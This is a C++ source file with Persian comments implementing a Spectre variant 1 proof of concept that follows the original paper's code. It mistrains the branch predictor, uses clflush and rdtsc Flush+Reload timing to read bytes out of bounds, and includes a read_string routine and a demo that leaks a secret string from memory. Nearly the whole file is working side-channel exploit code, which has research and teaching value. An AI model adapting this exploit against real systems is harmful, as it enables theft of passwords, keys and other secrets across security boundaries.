#include "spectre_v1.hpp"
#include "timer.hpp"
#include "statistics.hpp"
#include <cstring>
#include <vector>
#include <iostream>   // برای لاگ‌های موقت (اختیاری)

namespace {

// ============================================================
//  داده‌های ثابت (مشابه کد Appendix C مقاله)
// ============================================================
constexpr size_t array1_size = 16;
static uint8_t array1[160] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
};
static uint8_t array2[256 * 4096];    // 256 خانه، هر کدام 4096 بایت فاصله
static volatile uint8_t temp = 0;      // برای جلوگیری از بهینه‌سازی

// رشته‌ای که می‌خواهیم نشت دهیم (دقیقاً مثل مقاله)
static const char* secret = "The Magic Words are Squeamish Ossifrage.";

// آستانه تشخیص Hit/Miss – باید با هیستوگرام تنظیم شود
// در سیستم‌های جدید ممکن است نیاز به افزایش داشته باشد (مثلاً 120-180)
constexpr int CACHE_HIT_THRESHOLD = 150;

// ============================================================
//  تابع قربانی (Victim Function) – دقیقاً مثل مقاله
// ============================================================
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 4096];
    }
}

} // namespace anonymous

// ============================================================
//  پیاده‌سازی read_byte
// ============================================================
SpectreResult SpectreV1::read_byte(size_t malicious_x, int tries) {
    int results[256] = {0};

    for (int t = 0; t < tries; ++t) {
        // ---- ۱. Flush کردن تمام خانه‌های array2 ----
        for (int i = 0; i < 256; ++i) {
            Timer::clflush(&array2[i * 4096]);
        }

        // ---- ۲. Mistraining + حمله (مشابه حلقهٔ j در مقاله) ----
        // ۳۰ بار تکرار: ۲۵ بار آموزش (مجرا) و ۵ بار حمله (نامجرا)
        size_t training_x = t % array1_size;
        for (int j = 0; j < 30; ++j) {
            // قبل از هر بار صدا زدن victim_function، array1_size را flush می‌کنیم
            // تا پردازنده مجبور شود برای شرط از پیش‌بینی استفاده کند
            Timer::clflush(&array1_size);

            // یک تأخیر کوتاه با حلقهٔ بی‌اثر (برای اطمینان از اینکه پردازنده
            // منتظر می‌ماند و پیش‌بینی انجام می‌شود)
            for (volatile int z = 0; z < 100; ++z) {}

            // انتخاب مقدار x: اگر j < 25 باشد، آموزش (مجاز)؛ وگرنه حمله (نامجاز)
            size_t x = (j < 25) ? training_x : malicious_x;
            victim_function(x);
        }

        // ---- ۳. اندازه‌گیری زمان دسترسی به هر خانه از array2 (Reload) ----
        // ترتیب تصادفی برای جلوگیری از پیش‌بینی stride توسط سخت‌افزار
        for (int i = 0; i < 256; ++i) {
            int mix_i = ((i * 167) + 13) & 255;
            volatile char* addr = &array2[mix_i * 4096];

            Timer::serialize();
            uint64_t t1 = Timer::rdtsc();
            temp = *addr;          // دسترسی به حافظه
            Timer::serialize();
            uint64_t elapsed = Timer::rdtsc() - t1;

            if (elapsed <= CACHE_HIT_THRESHOLD) {
                results[mix_i]++;
            }
        }
    }

    // ---- ۴. پیدا کردن دو مقدار با بیشترین امتیاز ----
    int best = -1, second = -1;
    for (int i = 0; i < 256; ++i) {
        if (best < 0 || results[i] > results[best]) {
            second = best;
            best = i;
        } else if (second < 0 || results[i] > results[second]) {
            second = i;
        }
    }

    SpectreResult res;
    res.guessed_value = static_cast<uint8_t>(best);
    res.score = (best >= 0) ? results[best] : 0;
    res.second_score = (second >= 0) ? results[second] : 0;
    // معیار موفقیت از مقاله: بهترین حداقل ۲ برابر دوم + ۵ باشد
    res.success = (res.score >= 2 * res.second_score + 5);
    return res;
}

// ============================================================
//  پیاده‌سازی read_string (برای خواندن رشته‌های طولانی)
// ============================================================
std::string SpectreV1::read_string(size_t start_addr, size_t length, int tries) {
    std::string result;
    result.reserve(length);

    for (size_t i = 0; i < length; ++i) {
        size_t addr = start_addr + i;
        SpectreResult res = read_byte(addr, tries);
        if (res.success) {
            result.push_back(static_cast<char>(res.guessed_value));
        } else {
            // اگر نامشخص بود، علامت سوال می‌گذاریم
            result.push_back('?');
        }
        // برای لاگ‌گیری در حین اجرا (اختیاری)
        // std::cout << "Byte " << i << ": 0x" << std::hex << (int)res.guessed_value
        //           << " (" << (char)res.guessed_value << ") score=" << res.score << "\n";
    }
    return result;
}

void SpectreV1::run_demo(int tries) {
    uintptr_t secret_offset = reinterpret_cast<uintptr_t>(secret) - reinterpret_cast<uintptr_t>(array1);
    size_t secret_len = std::strlen(secret);
    std::string leaked = read_string(static_cast<size_t>(secret_offset), secret_len, tries);

    std::cout << "\n========== Spectre V1 Demo ==========" << std::endl;
    std::cout << "Leaked  : \"" << leaked << "\"" << std::endl;
    std::cout << "Original: \"" << secret << "\"" << std::endl;
    std::cout << "Match: " << (leaked == secret ? "YES" : "NO") << std::endl;
    std::cout << "=====================================\n";
}